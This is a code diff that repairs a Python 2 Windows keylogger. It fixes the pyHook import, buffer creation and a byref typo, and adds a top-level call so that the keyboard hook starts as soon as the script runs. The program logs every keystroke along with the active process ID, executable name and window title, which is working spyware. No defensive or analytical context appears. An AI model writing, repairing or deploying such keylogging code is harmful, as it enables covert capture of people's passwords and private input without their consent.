@@ -1,12 +1,16 @@
 from ctypes import *
 import pythoncom
-import pyhook
+import pyHook
 import win32clipboard
 
 user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
+
+def new_string_buffer():
+    '''call to create_string_buffer'''
+    return create_string_buffer('\x00' * 512)
 
 def get_current_process():
     '''get the current process'''
@@ -19,14 +23,14 @@ def get_current_process():
         #store the current process ID
         process_id = '%d' % pid.value
         # grab the executable
-        executable = create_string_buffer('\x100' * 512)
+        executable = new_string_buffer()
         h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
 
         psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
 
         # now read its title
-        window_title = create_string_buffer('\x00', * 512)
-        length = user32.GetWindowTextA(hwnd, bref(window_title), 512)
+        window_title = new_string_buffer()
+        length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
         # print out the header if we're in the right process
         print
         print '[ PID: %s - %s - %s]' % ( process_id, executable.value, window_title.value)
@@ -71,11 +75,12 @@ def KeyStroke(event):
         return True
 def main():
     '''create and register a hook manager'''
-    kl = pyhook.HookManager()
+    kl = pyHook.HookManager()
     kl.KeyDown = KeyStroke
     # register the hook and execute forever
     kl.HookKeyboard()
     pythoncom.PumpMessages()
+main()
 
 
 
